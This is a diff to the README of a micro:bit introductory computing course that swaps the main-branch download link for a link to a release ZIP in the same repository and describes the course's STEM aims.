@@ -1,10 +1,12 @@
 # Computing on microbit
+
+## Important
+### To download the latest stable version, please click below instead of using the "Download ZIP" button.
+### [Click here to download](https://github.com/arm-university/Introduction-to-Computing-with-microbit/releases/download/v2.0.0/Introduction-to-Computing-with-microbit-main.1.zip)
+
 Journey through all the features of the micro:bit with interactive activities and engaging projects to excite and enthuse learners. The course uses makecode as the programming interface and is suitable for learners of all ages and abilities. 
 
 ### All material has now been updated to include microbit V2.
-
-
-## [Download all materials here](https://github.com/arm-university/Introduction-to-Computing-with-microbit/archive/refs/heads/main.zip)
 
 ## Resource Aim
 This course introduces learners to the key STEM topics of physical computing, sensors, programming and Internet of Things (IoT) through project-based learning. Learners are immersed in a series of projects which involve rapid team-based development of a solution to meet specified criteria. These sprints of project-based work are interspersed with theory lessons that cover the core concepts necessary for the following projects.
